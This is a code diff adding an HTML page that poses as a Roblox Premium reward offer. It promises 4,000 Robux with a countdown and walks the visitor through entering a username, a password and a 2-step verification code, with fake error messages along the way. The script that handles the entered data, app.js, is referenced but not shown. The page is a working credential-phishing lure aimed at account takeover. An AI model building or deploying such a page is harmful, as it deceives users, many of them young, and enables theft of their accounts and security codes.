@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Roblox Premium — Claim Your Reward</title>
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+<meta property="og:title" content="Roblox Premium — Claim Your Reward">
+<meta property="og:description" content="You've been selected for 4,000 Robux. Verify your account to claim.">
+<meta property="og:type" content="website">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:"Helvetica Neue",Arial,sans-serif;background:#e9eaee;min-height:100vh;
+       display:flex;align-items:center;justify-content:center;padding:20px}
+  .card{background:#fff;width:100%;max-width:400px;border-radius:12px;padding:32px 28px;
+        box-shadow:0 8px 30px rgba(0,0,0,.15)}
+  .logo{width:44px;height:44px;margin:0 auto 16px;display:block}
+  h1{font-size:20px;text-align:center;color:#1b1b1b;margin-bottom:6px}
+  .sub{font-size:13px;color:#6b6b6b;text-align:center;margin-bottom:20px;line-height:1.5}
+  .badge{background:#e8f4ff;border:1px solid #bfe0ff;color:#0069b4;font-size:12px;
+         padding:8px 10px;border-radius:6px;margin-bottom:18px;text-align:center}
+  label{display:block;font-size:12px;font-weight:600;color:#333;margin-bottom:6px}
+  input{width:100%;padding:11px 12px;border:1px solid #c9ccd3;border-radius:6px;font-size:14px;
+        margin-bottom:14px;outline:none}
+  input:focus{border-color:#3b7bd4}
+  button{width:100%;padding:12px;background:#00a2ff;color:#fff;border:0;border-radius:6px;
+         font-size:15px;font-weight:600;cursor:pointer}
+  button:disabled{opacity:.6}
+  .step{display:none}.step.on{display:block}
+  .err{color:#c00;font-size:12px;margin-bottom:10px;display:none}
+  .spin{display:none;text-align:center;padding:16px 0;font-size:13px;color:#666}
+  .hint{font-size:11px;color:#8a8a8a;margin-top:12px;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+  <img class="logo" src="https://www.roblox.com/favicon.ico" alt="">
+  <h1 id="title">Claim Your 4,000 Robux</h1>
+  <p class="sub" id="sub">Sign in to verify your account and receive your reward.</p>
+  <div class="badge" id="badge">Reward reserved for the next 15 minutes</div>
+
+  <div class="step on" id="s1">
+    <label>Username</label>
+    <input id="user" autocapitalize="none" spellcheck="false" autocomplete="username">
+    <button onclick="next()">Next</button>
+  </div>
+
+  <div class="step" id="s2">
+    <label>Password</label>
+    <input id="pass" type="password" autocomplete="current-password">
+    <div class="err" id="e2">Incorrect username or password.</div>
+    <button id="b2" onclick="login()">Log In</button>
+    <p class="hint">Never share your password with anyone.</p>
+  </div>
+
+  <div class="step" id="s3">
+    <label>2-Step Verification Code</label>
+    <input id="code" inputmode="numeric" maxlength="6" autocomplete="one-time-code">
+    <div class="err" id="e3">Invalid code. Try again.</div>
+    <button id="b3" onclick="verify()">Verify</button>
+    <p class="hint">Sent to the email or app on your account.</p>
+  </div>
+
+  <div class="spin" id="spin">Checking…</div>
+</div>
+<script src="app.js"></script>
+</body>
+</html>
